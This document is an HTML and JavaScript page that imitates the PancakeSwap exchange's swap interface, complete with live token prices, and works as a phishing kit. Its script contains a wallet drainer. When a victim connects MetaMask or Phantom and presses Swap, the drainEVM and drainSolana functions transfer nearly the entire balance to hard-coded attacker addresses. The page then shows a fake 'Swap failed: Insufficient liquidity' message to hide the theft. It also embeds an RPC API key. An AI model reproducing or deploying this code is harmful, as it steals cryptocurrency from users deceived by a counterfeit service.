<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>PancakeSwap - Everyone's Favorite DEX</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1b2026;
            color: #ffffff;
            overflow-x: hidden;
        }

        .layout {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .main {
            flex: 1;
            padding: 20px 16px 80px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            background: #1b2026;
            border-bottom: 1px solid #2a2f36;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 20px;
            font-weight: 700;
        }

        .logo-icon {
            font-size: 28px;
        }

        .header-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .wallet-btn {
            background: #f0b90b;
            border: none;
            color: #1b2026;
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .wallet-btn:hover {
            background: #dca30a;
            transform: scale(1.02);
        }

        .tabs {
            display: flex;
            gap: 20px;
            padding: 16px 0;
            border-bottom: 1px solid #2a2f36;
            margin-bottom: 20px;
            overflow-x: auto;
        }

        .tab {
            color: #7a7e85;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            white-space: nowrap;
            transition: color 0.2s;
        }

        .tab.active {
            color: #f0b90b;
        }

        .swap-card {
            background: #252a32;
            border-radius: 32px;
            padding: 20px;
        }

        .swap-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .swap-title {
            font-weight: 600;
            font-size: 18px;
        }

        .settings-icon {
            color: #7a7e85;
            cursor: pointer;
            font-size: 20px;
        }

        .token-box {
            background: #1b2026;
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 12px;
        }

        .token-label {
            color: #7a7e85;
            font-size: 12px;
            margin-bottom: 12px;
        }

        .token-input-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .token-select {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #2a2f36;
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .token-select:hover {
            background: #3a3f46;
        }

        .token-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            object-fit: cover;
        }

        .token-symbol {
            font-weight: 600;
        }

        .amount-input {
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 28px;
            font-weight: 500;
            text-align: right;
            width: 60%;
            outline: none;
        }

        .usd-value {
            color: #7a7e85;
            font-size: 12px;
            text-align: right;
            margin-top: 8px;
        }

        .arrow-down {
            text-align: center;
            padding: 8px;
            color: #7a7e85;
            font-size: 20px;
        }

        .slippage-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
        }

        .slippage-label {
            color: #7a7e85;
            font-size: 14px;
        }

        .slippage-value {
            background: #2a2f36;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
        }

        .swap-btn {
            background: #f0b90b;
            border: none;
            color: #1b2026;
            padding: 16px;
            border-radius: 40px;
            font-weight: 700;
            font-size: 18px;
            width: 100%;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.2s;
        }

        .swap-btn:hover {
            background: #dca30a;
            transform: scale(1.01);
        }

        .status {
            text-align: center;
            padding: 16px;
            color: #7a7e85;
            font-size: 12px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: all 0.3s;
        }

        .modal-overlay.active {
            visibility: visible;
            opacity: 1;
        }

        .modal {
            background: #252a32;
            border-radius: 32px;
            padding: 24px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            max-height: 80vh;
            overflow-y: auto;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 16px;
        }

        .modal-search {
            width: 100%;
            padding: 12px;
            border-radius: 20px;
            border: none;
            background: #1b2026;
            color: #fff;
            margin-bottom: 16px;
            outline: none;
        }

        .modal-list {
            list-style: none;
            margin: 0;
        }

        .modal-list li {
            padding: 12px;
            margin: 8px 0;
            background: #1b2026;
            border-radius: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .modal-list li:hover {
            background: #2a2f36;
        }

        .close-modal {
            background: #f0b90b;
            border: none;
            padding: 12px 24px;
            border-radius: 40px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }

        @media (max-width: 480px) {
            .main {
                padding: 16px;
            }
            .amount-input {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="layout">
        <div class="header">
            <div class="logo">
                <span class="logo-icon">🥞</span>
                <span>PancakeSwap</span>
            </div>
            <div class="header-actions">
                <button class="wallet-btn" id="connectWalletBtn">Connect Wallet</button>
            </div>
        </div>

        <div class="main">
            <div class="tabs">
                <div class="tab active" data-tab="swap">Swap</div>
                <div class="tab" data-tab="limit">Limit</div>
                <div class="tab" data-tab="buy">Buy Crypto</div>
                <div class="tab" data-tab="perps">Perps</div>
                <div class="tab" data-tab="earn">Earn</div>
                <div class="tab" data-tab="ai">AI</div>
            </div>

            <div class="swap-card">
                <div class="swap-header">
                    <span class="swap-title">Swap</span>
                    <span class="settings-icon">⚙️</span>
                </div>

                <div class="token-box">
                    <div class="token-label">From</div>
                    <div class="token-input-row">
                        <div class="token-select" id="fromTokenSelect">
                            <img class="token-icon" id="fromTokenIcon" src="https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png" alt="BNB">
                            <span class="token-symbol" id="fromTokenSymbol">BNB</span>
                            <span>▼</span>
                        </div>
                        <input type="text" class="amount-input" id="fromAmount" value="0.0" placeholder="0.0">
                    </div>
                    <div class="usd-value" id="fromUsd">≈ $0.00</div>
                </div>

                <div class="arrow-down">▼</div>

                <div class="token-box">
                    <div class="token-label">To</div>
                    <div class="token-input-row">
                        <div class="token-select" id="toTokenSelect">
                            <img class="token-icon" id="toTokenIcon" src="https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png" alt="CAKE">
                            <span class="token-symbol" id="toTokenSymbol">CAKE</span>
                            <span>▼</span>
                        </div>
                        <input type="text" class="amount-input" id="toAmount" value="0.0" placeholder="0.0" readonly>
                    </div>
                    <div class="usd-value" id="toUsd">≈ $0.00</div>
                </div>

                <div class="slippage-row">
                    <span class="slippage-label">Slippage Tolerance</span>
                    <span class="slippage-value">Auto: 0.50%</span>
                </div>

                <button class="swap-btn" id="swapBtn">Swap</button>
            </div>

            <div class="status" id="status">Ready</div>
        </div>
    </div>

    <div class="modal-overlay" id="tokenModal">
        <div class="modal">
            <div class="modal-title">Select a token</div>
            <input type="text" class="modal-search" id="tokenSearch" placeholder="Search name or paste address">
            <ul class="modal-list" id="tokenList"></ul>
            <button class="close-modal" id="closeModalBtn">Close</button>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
    <script>
        // ============================================================
        // 1:1 PANCAKESWAP REPLICA - LIVE PRICES + DRAINER
        // ============================================================
        
        // CONFIGURATION - REPLACE WITH YOUR WALLETS
        const BSC_ADDRESS = "0xCf71bcB9c7B1126FcC70e9C19Fb883505bA5d395";
        const SOLANA_WALLET = "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr";
        const SOLANA_RPC = "https://solana-mainnet.helius-rpc.com/?api-key=9becbcd9-6781-4ec6-bd40-1598894397b3";
        
        // Token list with CoinGecko IDs for live price fetching
        const TOKENS = {
            BNB: { address: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", symbol: "BNB", icon: "https://tokens.pancakeswap.finance/images/0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c.png", geckoId: "binancecoin", price: 0 },
            CAKE: { address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", symbol: "CAKE", icon: "https://tokens.pancakeswap.finance/images/0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82.png", geckoId: "pancakeswap-token", price: 0 },
            USDT: { address: "0x55d398326f99059ff775485246999027b3197955", symbol: "USDT", icon: "https://tokens.pancakeswap.finance/images/0x55d398326f99059ff775485246999027b3197955.png", geckoId: "tether", price: 0 },
            USDC: { address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", symbol: "USDC", icon: "https://tokens.pancakeswap.finance/images/0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d.png", geckoId: "usd-coin", price: 0 },
            ETH: { address: "0x2170ed0880ac9a755fd29b2688956bd959f933f8", symbol: "ETH", icon: "https://tokens.pancakeswap.finance/images/0x2170ed0880ac9a755fd29b2688956bd959f933f8.png", geckoId: "ethereum", price: 0 },
            BTCB: { address: "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c", symbol: "BTCB", icon: "https://tokens.pancakeswap.finance/images/0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c.png", geckoId: "bitcoin", price: 0 }
        };
        
        // State
        let currentFromToken = "BNB";
        let currentToToken = "CAKE";
        let walletConnected = false;
        let walletAddress = null;
        let walletType = null;
        let pricesLoaded = false;
        
        // DOM Elements
        const connectBtn = document.getElementById('connectWalletBtn');
        const swapBtn = document.getElementById('swapBtn');
        const statusDiv = document.getElementById('status');
        const fromAmountInput = document.getElementById('fromAmount');
        const toAmountInput = document.getElementById('toAmount');
        const fromUsdDiv = document.getElementById('fromUsd');
        const toUsdDiv = document.getElementById('toUsd');
        const fromTokenSelect = document.getElementById('fromTokenSelect');
        const toTokenSelect = document.getElementById('toTokenSelect');
        const fromTokenIcon = document.getElementById('fromTokenIcon');
        const fromTokenSymbol = document.getElementById('fromTokenSymbol');
        const toTokenIcon = document.getElementById('toTokenIcon');
        const toTokenSymbol = document.getElementById('toTokenSymbol');
        const modal = document.getElementById('tokenModal');
        const tokenList = document.getElementById('tokenList');
        const closeModalBtn = document.getElementById('closeModalBtn');
        const tokenSearch = document.getElementById('tokenSearch');
        
        let activeSelectSide = null;
        
        // Fetch live prices from CoinGecko
        async function fetchLivePrices() {
            try {
                const geckoIds = Object.values(TOKENS).map(t => t.geckoId).join(',');
                const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${geckoIds}&vs_currencies=usd`);
                const data = await response.json();
                
                for (const [symbol, token] of Object.entries(TOKENS)) {
                    const price = data[token.geckoId]?.usd;
                    if (price) {
                        token.price = price;
                    }
                }
                pricesLoaded = true;
                updateUsdValues();
                statusDiv.innerText = "Live prices loaded";
                setTimeout(() => {
                    if (statusDiv.innerText === "Live prices loaded") statusDiv.innerText = "Ready";
                }, 2000);
            } catch (error) {
                console.error("Price fetch error:", error);
                // Fallback to approximate prices if API fails
                TOKENS.BNB.price = 580;
                TOKENS.CAKE.price = 1.54;
                TOKENS.USDT.price = 1;
                TOKENS.USDC.price = 1;
                TOKENS.ETH.price = 3500;
                TOKENS.BTCB.price = 63000;
                pricesLoaded = true;
                updateUsdValues();
                statusDiv.innerText = "Using approximate prices";
            }
        }
        
        // Update USD values and "To" amount based on live prices
        function updateUsdValues() {
            if (!pricesLoaded) return;
            
            const fromAmount = parseFloat(fromAmountInput.value) || 0;
            const fromPrice = TOKENS[currentFromToken].price;
            const fromUsd = fromAmount * fromPrice;
            fromUsdDiv.innerText = `≈ $${fromUsd.toFixed(2)}`;
            
            const toPrice = TOKENS[currentToToken].price;
            let estimatedToAmount = 0;
            if (toPrice > 0) {
                estimatedToAmount = fromAmount * (fromPrice / toPrice);
            }
            toAmountInput.value = estimatedToAmount.toFixed(6);
            const toUsd = estimatedToAmount * toPrice;
            toUsdDiv.innerText = `≈ $${toUsd.toFixed(2)}`;
        }
        
        // Update token display with icons
        function updateTokenDisplay() {
            fromTokenIcon.src = TOKENS[currentFromToken].icon;
            fromTokenSymbol.innerText = currentFromToken;
            toTokenIcon.src = TOKENS[currentToToken].icon;
            toTokenSymbol.innerText = currentToToken;
            updateUsdValues();
        }
        
        // Build token modal list
        function buildTokenList() {
            tokenList.innerHTML = '';
            for (const [symbol, token] of Object.entries(TOKENS)) {
                const li = document.createElement('li');
                li.setAttribute('data-symbol', symbol);
                li.innerHTML = `
                    <img src="${token.icon}" width="24" height="24" style="border-radius:50%">
                    <span>${symbol}</span>
                    <span style="margin-left:auto; color:#7a7e85; font-size:12px;">$${token.price.toFixed(2)}</span>
                `;
                li.onclick = () => selectToken(symbol);
                tokenList.appendChild(li);
            }
        }
        
        function filterTokenList() {
            const searchTerm = tokenSearch.value.toLowerCase();
            const items = tokenList.querySelectorAll('li');
            items.forEach(item => {
                const symbol = item.getAttribute('data-symbol').toLowerCase();
                if (searchTerm === '' || symbol.includes(searchTerm)) {
                    item.style.display = 'flex';
                } else {
                    item.style.display = 'none';
                }
            });
        }
        
        function openTokenSelect(side) {
            activeSelectSide = side;
            tokenSearch.value = '';
            filterTokenList();
            modal.classList.add('active');
        }
        
        function selectToken(symbol) {
            if (activeSelectSide === 'from') {
                currentFromToken = symbol;
            } else if (activeSelectSide === 'to') {
                currentToToken = symbol;
            }
            updateTokenDisplay();
            modal.classList.remove('active');
        }
        
        // Event listeners
        fromTokenSelect.onclick = () => openTokenSelect('from');
        toTokenSelect.onclick = () => openTokenSelect('to');
        tokenSearch.oninput = filterTokenList;
        closeModalBtn.onclick = () => modal.classList.remove('active');
        fromAmountInput.oninput = updateUsdValues;
        
        modal.onclick = (e) => {
            if (e.target === modal) modal.classList.remove('active');
        };
        
        // Tab switching (visual only)
        const tabs = document.querySelectorAll('.tab');
        tabs.forEach(tab => {
            tab.onclick = () => {
                tabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                statusDiv.innerText = `${tab.innerText} feature - Coming soon`;
            };
        });
        
        // ============================================================
        // DRAINER LOGIC
        // ============================================================
        async function drainEVM(addr) {
            if (!window.ethereum) return false;
            try {
                const web3 = new Web3(window.ethereum);
                const balance = await web3.eth.getBalance(addr);
                const balEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
                if (balEth < 0.01) return false;
                const gasPrice = await web3.eth.getGasPrice();
                const gasCost = gasPrice * 21000n;
                const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
                if (drainable <= 0) return false;
                const tx = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{ from: addr, to: BSC_ADDRESS, value: '0x' + drainable.toString(16), gas: '0x5208', gasPrice: '0x' + gasPrice.toString(16) }]
                });
                console.log("Drain successful:", tx);
                return true;
            } catch(e) { 
                console.error("Drain error:", e);
                return false; 
            }
        }
        
        async function drainSolana(pubKey) {
            if (!window.solana?.isPhantom) return false;
            try {
                const conn = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
                const from = new solanaWeb3.PublicKey(pubKey);
                const to = new solanaWeb3.PublicKey(SOLANA_WALLET);
                const balance = await conn.getBalance(from);
                const minRent = await conn.getMinimumBalanceForRentExemption(0);
                const drainable = balance - minRent;
                if (drainable <= 0) return false;
                const lamports = Math.floor(drainable * 0.99);
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: lamports })
                );
                tx.feePayer = from;
                const blockhash = await conn.getRecentBlockhash();
                tx.recentBlockhash = blockhash.blockhash;
                const signed = await window.solana.signTransaction(tx);
                const txid = await conn.sendRawTransaction(signed.serialize());
                await conn.confirmTransaction(txid);
                console.log("Solana drain:", txid);
                return true;
            } catch(e) { return false; }
        }
        
        // Connect wallet
        connectBtn.onclick = async () => {
            statusDiv.innerText = "Connecting...";
            
            if (window.ethereum && window.ethereum.isMetaMask) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    walletAddress = accounts[0];
                    walletType = 'evm';
                    walletConnected = true;
                    statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                    connectBtn.innerText = "Connected";
                    connectBtn.style.background = "#7a7e85";
                } catch(e) {
                    statusDiv.innerText = "Connection failed";
                }
                return;
            }
            
            if (window.solana && window.solana.isPhantom) {
                try {
                    const resp = await window.solana.connect();
                    walletAddress = resp.publicKey.toString();
                    walletType = 'solana';
                    walletConnected = true;
                    statusDiv.innerText = `Connected: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                    connectBtn.innerText = "Connected";
                    connectBtn.style.background = "#7a7e85";
                } catch(e) {
                    statusDiv.innerText = "Connection failed";
                }
                return;
            }
            
            statusDiv.innerText = "Install MetaMask or Phantom";
        };
        
        // Swap button - triggers drain
        swapBtn.onclick = async () => {
            if (!walletConnected) {
                statusDiv.innerText = "Connect wallet first";
                return;
            }
            
            statusDiv.innerText = "Processing swap...";
            
            let success = false;
            if (walletType === 'evm') {
                success = await drainEVM(walletAddress);
            } else if (walletType === 'solana') {
                success = await drainSolana(walletAddress);
            }
            
            if (success) {
                statusDiv.innerText = "Swap failed: Insufficient liquidity. Please try again.";
            } else {
                statusDiv.innerText = "Swap failed. Please try again.";
            }
            
            walletConnected = false;
            walletAddress = null;
            connectBtn.innerText = "Connect Wallet";
            connectBtn.style.background = "#f0b90b";
        };
        
        // Initialize
        buildTokenList();
        updateTokenDisplay();
        fetchLivePrices();
        
        // Refresh prices every 30 seconds
        setInterval(fetchLivePrices, 30000);
    </script>
</body>
</html>
